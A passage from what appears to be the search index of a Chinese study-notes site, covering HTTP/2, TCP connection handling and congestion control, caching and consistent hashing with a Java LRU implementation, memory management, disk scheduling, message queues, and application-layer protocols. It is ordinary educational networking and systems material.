因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高额费用。 HTTP/2.0 # HTTP/1.x 缺陷 # HTTP/1.x 实现简单是以牺牲性能为代价的：\n客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。 二进制分帧层 # HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。\n在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。\n一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。 服务端推送 # HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。\n首部压缩 # HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。\nHTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。\n不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。\nHTTP/1.1 新特性 # 默认是长连接 支持流水线 支持同时打开多个 TCP 连接 支持虚拟主机 新增状态码 100 支持分块传输编码 新增缓存处理指令 max-age 参考资料 # 上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014. MDN : HTTP HTTP/2 简介 htmlspecialchars Difference between file URI and URL in java How to Fix SQL Injection Using Java PreparedStatement \u0026amp; CallableStatement 浅谈 HTTP 中 Get 与 Post 的区别 Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY \u0026amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs Cookie 与 Session 的区别 COOKIE 和 SESSION 有什么区别 Cookie/Session 的机制与安全 HTTPS 证书原理 What is the difference between a URI, a URL and a URN? XMLHttpRequest XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST? Symmetric vs. Asymmetric Encryption – What are differences? Web 性能优化与 HTTP/2 HTTP/2 简介 "},{"id":28,"href":"/keeplearning/docs/network/transport-layer/","title":"传输层","section":"网络","content":" 传输层 # 网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。传输层提供了进程间的逻辑通信，传输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个传输层实体之间有一条端到端的逻辑通信信道。\nUDP 和 TCP 的特点 # 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。\n传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。\nUDP 首部格式 # 首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。\nTCP 首部格式 # 序号 ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。\n确认号 ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。\n数据偏移 ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。\n确认 ACK ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。\n**同步 SYN ** ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。\n终止 FIN ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。\n窗口 ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。\nTCP 的三次握手 # 假设 A 为客户端，B 为服务器端。\n首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。\nA 向 B 发送连接请求报文，SYN=1，ACK=0，选择一个初始的序号 x。\nB 收到连接请求报文，如果同意建立连接，则向 A 发送连接确认报文，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。\nA 收到 B 的连接确认报文后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。\nB 收到 A 的确认后，连接建立。\n三次握手的原因\n第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。\n客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。客户端等待一个超时重传时间之后，就会重新请求连接。但是这个滞留的连接请求最后还是会到达服务器，如果不进行三次握手，那么服务器就会打开两个连接。如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。\nTCP 的四次挥手 # 以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。\nA 发送连接释放报文，FIN=1。\nB 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。\n当 B 不再需要连接时，发送连接释放报文，FIN=1。\nA 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接。\nB 收到 A 的确认后释放连接。\n四次挥手的原因\n客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。\nTIME_WAIT\n客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由：\n确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。\n等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。\nTCP 可靠传输 # TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。\n一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下：\n其中，0 ≤ a ＜ 1，RTTs 随着 a 的增加更容易受到 RTT 的影响。 超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下：\n其中 RTTd 为偏差的加权平均值。 TCP 滑动窗口 # 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。\n发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。\n接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。\nTCP 流量控制 # 流量控制是为了控制发送方发送速率，保证接收方来得及接收。\n接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。\nTCP 拥塞控制 # 如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。\nTCP 主要通过四个算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。\n发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。\n为了便于讨论，做如下假设：\n接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。 1. 慢开始与拥塞避免 # 发送的最初执行慢开始，令 cwnd = 1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 \u0026hellip;\n注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。设置一个慢开始门限 ssthresh，当 cwnd \u0026gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。\n如果出现了超时，则令 ssthresh = cwnd / 2，然后重新执行慢开始。\n2. 快重传与快恢复 # 在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。\n在发送方，如果收到三个重复确认，那么可以知道下一个报文段丢失，此时执行快重传，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。\n在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令 ssthresh = cwnd / 2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。\n慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh。\n"},{"id":29,"href":"/keeplearning/docs/system-design/cache/","title":"缓存","section":"系统设计","content":" 缓存 # 一、缓存特征 # 命中率 # 当某个请求能够通过访问缓存而得到响应时，称为缓存命中。\n缓存命中率越高，缓存的利用率也就越高。\n最大空间 # 缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。\n当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。\n淘汰策略 # FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。\nLRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。\nLFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。\n二、缓存位置 # 浏览器 # 当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。\nISP # 网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。\n反向代理 # 反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。\n本地缓存 # 使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。\n分布式缓存 # 使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。\n相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。\n数据库缓存 # MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。\nJava 内部的缓存 # Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。\nCPU 多级缓存 # CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。\n三、CDN # 内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。\nCDN 主要有以下优点：\n更快地将数据分发给用户； 通过部署多台服务器，从而提高系统整体的带宽性能； 多台服务器可以看成是一种冗余机制，从而具有高可用性。 四、缓存问题 # 缓存穿透 # 指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。\n解决方案：\n对这些不存在的数据缓存一个空数据； 对这类请求进行过滤。 缓存雪崩 # 指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。\n在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。\n解决方案：\n为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现； 为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。 也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。 缓存一致性 # 缓存一致性要求数据更新的同时缓存数据也能够实时更新。\n解决方案：\n在数据更新的同时立即去更新缓存； 在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。 要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。\n缓存 “无底洞” 现象 # 指的是为了满足业务要求添加了大量缓存节点，但是性能不但没有好转反而下降了的现象。\n产生原因：缓存系统通常采用 hash 函数将 key 映射到对应的缓存节点，随着缓存节点数目的增加，键值分布到更多的节点上，导致客户端一次批量操作会涉及多次网络操作，这意味着批量操作的耗时会随着节点数目的增加而不断增大。此外，网络连接数变多，对节点的性能也有一定影响。\n解决方案：\n优化批量数据操作命令； 减少网络通信次数； 降低接入成本，使用长连接 / 连接池，NIO 等。 五、数据分布 # 哈希分布 # 哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。\n传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。\n顺序分布 # 将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，\u0026hellip;，6001 ~ 7000。\n顺序分布相比于哈希分布的主要优点如下：\n能保持数据原有的顺序； 并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。 六、一致性哈希 # Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。\n基本原理 # 将哈希空间 [0, 2n-1] 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。\n一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。\n虚拟节点 # 上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。\n数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。\n解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。\n七、LRU # 以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下：\n访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。 为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。 public class LRU\u0026lt;K, V\u0026gt; implements Iterable\u0026lt;K\u0026gt; { private Node head; private Node tail; private HashMap\u0026lt;K, Node\u0026gt; map; private int maxSize; private class Node { Node pre; Node next; K k; V v; public Node(K k, V v) { this.k = k; this.v = v; } } public LRU(int maxSize) { this.maxSize = maxSize; this.map = new HashMap\u0026lt;\u0026gt;(maxSize * 4 / 3); head = new Node(null, null); tail = new Node(null, null); head.next = tail; tail.pre = head; } public V get(K key) { if (!map.containsKey(key)) { return null; } Node node = map.get(key); unlink(node); appendHead(node); return node.v; } public void put(K key, V value) { if (map.containsKey(key)) { Node node = map.get(key); unlink(node); } Node node = new Node(key, value); map.put(key, node); appendHead(node); if (map.size() \u0026gt; maxSize) { Node toRemove = removeTail(); map.remove(toRemove.k); } } private void unlink(Node node) { Node pre = node.pre; Node next = node.next; pre.next = next; next.pre = pre; node.pre = null; node.next = null; } private void appendHead(Node node) { Node next = head.next; node.next = next; next.pre = node; node.pre = head; head.next = node; } private Node removeTail() { Node node = tail.pre; Node pre = node.pre; tail.pre = pre; pre.next = tail; node.pre = null; node.next = null; return node; } @Override public Iterator\u0026lt;K\u0026gt; iterator() { return new Iterator\u0026lt;K\u0026gt;() { private Node cur = head.next; @Override public boolean hasNext() { return cur != tail; } @Override public K next() { Node node = cur; cur = cur.next; return node.k; } }; } } 参考资料 # 大规模分布式存储系统 缓存那些事 一致性哈希算法 内容分发网络 How Aspiration CDN helps to improve your website loading speed? "},{"id":30,"href":"/keeplearning/docs/os/memory-manage/","title":"内存管理","section":"操作系统","content":" 内存管理 # 虚拟内存 # 虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。\n为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。\n从上面的描述中可以看出，虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序成为可能。例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。\n分页系统地址映射 # 内存管理单元（MMU）管理着地址空间和物理内存的转换，其中的页表（Page table）存储着页（程序地址空间）和页框（物理内存空间）的映射表。\n一个虚拟地址分成两个部分，一部分存储页面号，一部分存储偏移量。\n下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。例如对于虚拟地址（0010 000000000100），前 4 位是存储页面号 2，读取表项内容为（110 1），页表项最后一位表示是否存在于内存中，1 表示存在。后 12 位存储偏移量。这个页对应的页框的地址为 （110 000000000100）。\n页面置换算法 # 在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。\n页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。\n页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。\n1. 最佳 # OPT, Optimal replacement algorithm\n所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。\n是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。\n举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列：\n7，0，1，2，0，3，0，4，2，3，0，3，2，1，2，0，1，7，0，1 开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。\n2. 最近最久未使用 # LRU, Least Recently Used\n虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。\n为了实现 LRU，需要在内存中维护一个所有页面的链表。当一个页面被访问时，将这个页面移到链表表头。这样就能保证链表表尾的页面是最近最久未访问的。\n因为每次访问都需要更新链表，因此这种方式实现的 LRU 代价很高。\n4，7，0，7，1，0，1，2，1，2，6 ### 3. 最近未使用 NRU, Not Recently Used\n每个页面都有两个状态位：R 与 M，当页面被访问时设置页面的 R=1，当页面被修改时设置 M=1。其中 R 位会定时被清零。可以将页面分成以下四类：\nR=0，M=0 R=0，M=1 R=1，M=0 R=1，M=1 当发生缺页中断时，NRU 算法随机地从类编号最小的非空类中挑选一个页面将它换出。\nNRU 优先换出已经被修改的脏页面（R=0，M=1），而不是被频繁使用的干净页面（R=1，M=0）。\n4. 先进先出 # FIFO, First In First Out\n选择换出的页面是最先进入的页面。\n该算法会将那些经常被访问的页面换出，导致缺页率升高。\n5. 第二次机会算法 # FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改：\n当页面被访问 (读或写) 时设置该页面的 R 位为 1。需要替换的时候，检查最老页面的 R 位。如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。\n6. 时钟 # Clock\n第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面连接起来，再使用一个指针指向最老的页面。\n分段 # 虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。\n下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。\n分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。\n段页式 # 程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。\n分页与分段的比较 # 对程序员的透明性：分页透明，但是分段需要程序员显式划分每个段。\n地址空间的维度：分页是一维地址空间，分段是二维的。\n大小是否可以改变：页的大小不可变，段的大小可以动态改变。\n出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。\n"},{"id":31,"href":"/keeplearning/docs/os/device-manage/","title":"设备管理","section":"操作系统","content":" 设备管理 # 磁盘结构 # 盘面（Platter）：一个磁盘有多个盘面； 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道； 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小； 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）； 制动手臂（Actuator arm）：用于在磁道之间移动磁头； 主轴（Spindle）：使整个盘面转动。 磁盘调度算法 # 读写一个磁盘块的时间的影响因素有：\n旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上） 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上） 实际的数据传输时间 其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。\n1. 先来先服务 # FCFS, First Come First Served\n按照磁盘请求的顺序进行调度。\n优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。\n2. 最短寻道时间优先 # SSTF, Shortest Seek Time First\n优先调度与当前磁头所在磁道距离最近的磁道。\n虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。\n3. 电梯算法 # SCAN\n电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。\n电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。\n因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。\n"},{"id":32,"href":"/keeplearning/docs/system-design/queue-message/","title":"消息队列","section":"系统设计","content":" 消息队列 # 一、消息模型 # 点对点 # 消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。\n发布/订阅 # 消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。\n发布与订阅模式和观察者模式有以下不同：\n观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。 二、使用场景 # 异步处理 # 发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。\n例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。\n只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。\n流量削锋 # 在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。\n可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。\n应用解耦 # 如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。\n通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。\n三、可靠性 # 发送端的可靠性 # 发送端完成操作后一定能将消息成功发送到消息队列中。\n实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。\n接收端的可靠性 # 接收端能够从消息队列成功消费一次消息。\n两种实现方法：\n保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。 参考资料 # Observer vs Pub-Sub 消息队列中点对点与发布订阅区别 "},{"id":33,"href":"/keeplearning/docs/network/application-layer/","title":"应用层","section":"网络","content":" 应用层 # 域名系统 # DNS 是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。\n域名具有层次结构，从上到下依次为：根域名、顶级域名、二级域名。\nDNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。在两种情况下会使用 TCP 进行传输：\n如果返回的响应超过的 512 字节（UDP 最大只支持 512 字节的数据）。 区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。 文件传送协议 # FTP 使用 TCP 进行连接，它需要两个连接来传送一个文件：\n控制连接：服务器打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。 数据连接：用来传送一个文件数据。 根据数据连接是否是服务器端主动建立，FTP 有主动和被动两种模式：\n主动模式：服务器端主动建立数据连接，其中服务器端的端口号为 20，客户端的端口号随机，但是必须大于 1024，因为 0~1023 是熟知端口号。 被动模式：客户端主动建立数据连接，其中客户端的端口号由客户端自己指定，服务器端的端口号随机。 主动模式要求客户端开放端口号给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是被动模式会导致服务器端的安全性减弱，因为开放了过多的端口号。\n动态主机配置协议 # DHCP (Dynamic Host Configuration Protocol) 提供了即插即用的连网方式，用户不再需要手动配置 IP 地址等信息。\nDHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。\nDHCP 工作过程如下：\n客户端发送 Discover 报文，该报文的目的地址为 255.255.255.255:67，源地址为 0.0.0.0:68，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。 DHCP 服务器收到 Discover 报文之后，发送 Offer 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 Request 报文给该 DHCP 服务器。 DHCP 服务器发送 Ack 报文，表示客户端此时可以使用提供给它的信息。 远程登录协议 # TELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。\nTELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。\n电子邮件协议 # 一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件协议。\n邮件协议包含发送协议和读取协议，发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。\n1. SMTP # SMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主体的结构，定义了非 ASCII 码的编码规则。\n2. POP3 # POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。但最新版本的 POP3 可以不删除邮件。\n3. IMAP # IMAP 协议中客户端和服务器上的邮件保持同步，如果不手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。\n常用端口 # 应用 应用层协议 端口号 传输层协议 备注 域名解析 DNS 53 UDP/TCP 长度超过 512 字节时使用 TCP 动态主机配置协议 DHCP 67/68 UDP 简单网络管理协议 SNMP 161/162 